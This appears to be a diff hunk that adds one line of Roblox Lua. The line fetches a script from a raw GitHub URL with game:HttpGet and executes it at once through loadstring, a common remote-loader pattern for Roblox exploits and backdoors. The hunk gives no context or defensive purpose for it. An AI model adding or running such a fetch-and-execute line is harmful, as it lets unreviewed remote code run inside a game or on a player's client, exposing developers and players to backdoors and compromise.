@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ice-byte10/StarterPlayerScripts/refs/heads/main/testCode"))()
